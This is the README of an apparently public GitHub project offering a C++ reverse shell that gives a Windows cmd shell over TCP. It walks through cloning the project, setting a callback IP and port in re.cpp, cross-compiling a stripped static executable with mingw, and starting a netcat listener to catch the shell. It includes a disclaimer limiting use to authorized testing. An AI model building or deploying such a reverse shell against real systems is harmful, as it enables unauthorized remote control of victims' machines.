<p align="center">
  <img src="https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/C++%20Reverse%20Shell%20Logo.png?raw=true" alt="C++ Reverse Shell logo" width="420">
</p>

# C++ Reverse Shell

A simple C++ based reverse shell that gives a Windows `cmd` shell over TCP.

> **For authorized testing and education only.** Use it solely on systems you own or have explicit written permission to test. See [`docs/detection-notes.md`](docs/detection-notes.md) for the defensive / detection side.


## installation

    $ apt install mingw-w64
    $ git clone https://github.com/dev-frog/C-Reverse-Shell.git
    $ cd C-Reverse-Shell
  


## Change the IP and port number in the source code

Open **re.cpp** and change the **IP address** and **port number**.

![alt text](https://github.com/dev-frog/C-Reverse-Shell/blob/master/img/re.PNG)

    70 else {
    71    char host[] = "192.168.0.101";  // change this to your ip address
    72    int port = 4444;                // change this to your open port
    73    RunShell(host, port);
    74}
    


## Compile it

    i686-w64-mingw32-g++ re.cpp -o re.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

## Start  the netcat Listener
 

     nc -lvnp <port number>

